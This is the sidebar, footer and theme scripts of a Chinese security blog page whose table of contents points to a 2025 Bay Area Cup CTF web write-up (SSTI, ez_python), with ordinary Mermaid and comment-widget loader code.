id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">symv1a</div><div class="author-info-description">随便写写，随缘更新</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/symya"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/symya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:symv1a@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">今日事，今日毕</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025%E5%B9%B4%E6%B9%BE%E5%8C%BA%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb%E9%A2%98%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">2025年湾区杯网络安全大赛web题解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti"><span class="toc-number">2.1.</span> <span class="toc-text">ssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-python"><span class="toc-number">2.2.</span> <span class="toc-text">ez_python</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/cve202551482-letta-ai-component-code-injection-leads-to-rce-zxwmhs.html" title="CVE-2025-51482 Letta AI 组件代码注入导致RCE">CVE-2025-51482 Letta AI 组件代码注入导致RCE</a><time datetime="2026-01-07T10:40:09.000Z" title="Created 2026-01-07 10:40:09">2026-01-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/cve20253248-z2i1g0l.html" title="CVE-2025-3248">CVE-2025-3248</a><time datetime="2026-01-05T09:56:35.000Z" title="Created 2026-01-05 09:56:35">2026-01-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/basic-use-of-suricata-23gslt.html" title="suricata基本使用">suricata基本使用</a><time datetime="2025-12-26T16:37:21.000Z" title="Created 2025-12-26 16:37:21">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/mac-ida-pro9.2-mcp-traepei-zhi-jiao-cheng-1r5x1m.html" title="MAC+IDA Pro9.2+MCP+Trae配置教程">MAC+IDA Pro9.2+MCP+Trae配置教程</a><time datetime="2025-12-24T09:44:55.000Z" title="Created 2025-12-24 09:44:55">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/2025rctf-wp-1ljcfy.html" title="2025RCTF wp">2025RCTF wp</a><time datetime="2025-11-20T15:51:03.000Z" title="Created 2025-11-20 15:51:03">2025-11-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/symya/MyPic/2025/wallhaven-z8egpo.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By symv1a</span></div><div class="footer_custom_text">Hi, welcome to my <a href="https://symya.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: '',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
